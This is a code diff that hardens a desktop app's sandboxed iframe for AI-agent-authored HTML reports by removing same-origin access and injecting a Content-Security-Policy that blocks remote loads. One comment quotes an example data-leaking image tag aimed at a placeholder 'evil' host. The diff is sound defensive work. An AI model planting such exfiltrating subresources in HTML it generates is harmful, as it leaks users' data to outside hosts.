@@ -294,6 +294,22 @@ function RailSection({
   );
 }
 
+// OPE-91: agent-authored HTML is untrusted active content rendered inside the PRIVILEGED
+// app webview (Tauri IPC). The sandbox must therefore be airtight on two axes:
+//  - no `allow-same-origin`: with srcDoc, that flag would run the page same-origin with
+//    the app — scripts could reach the parent document and the IPC bridge.
+//  - no network: a poisoned report exfiltrates at DISPLAY time via subresources
+//    (<img src="https://evil/?leak=…">). The injected CSP allows inline style/script
+//    (what report interactivity needs) and data: images; everything remote is blocked.
+// Injected at position 0 so it takes effect before any content the page declares.
+const ARTIFACT_CSP =
+  '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; ' +
+  "style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;\">";
+
+function sandboxHtml(html: string): string {
+  return ARTIFACT_CSP + html;
+}
+
 function ArtifactViewer({
   sessionId,
   artifact,
@@ -349,6 +365,20 @@ function ArtifactViewer({
               <Icon name="panelOpen" size={16} />
             </button>
           )}
+          {isHtml && (
+            // The sandboxed preview is deliberately offline and null-origin; a real
+            // browser tab (system default app, outside app privileges) is the escape
+            // hatch for sharing or printing the page.
+            <button
+              className="artifact-icon-btn"
+              data-testid="artifact-open-browser"
+              onClick={() => revealArtifact(sessionId, artifact.path, "open")}
+              aria-label="Open in browser"
+              title="Open in browser"
+            >
+              <Icon name="panelOpen" size={16} />
+            </button>
+          )}
           {/* Copy the ABSOLUTE path — the workspace-relative one is useless outside the app
               (tester catch 2026-07-12: it copied just "slack-connector-debug.md"). */}
           <button
@@ -377,9 +407,10 @@ function ArtifactViewer({
         ) : content.kind === "html" ? (
           <iframe
             key={`${artifact.path}-${reloadKey}`}
-            sandbox="allow-scripts allow-same-origin"
+            sandbox="allow-scripts"
             className="artifact-frame"
-            srcDoc={content.content || ""}
+            data-testid="artifact-frame"
+            srcDoc={sandboxHtml(content.content || "")}
           />
         ) : content.kind === "markdown" ? (
           <div className="artifact-md">
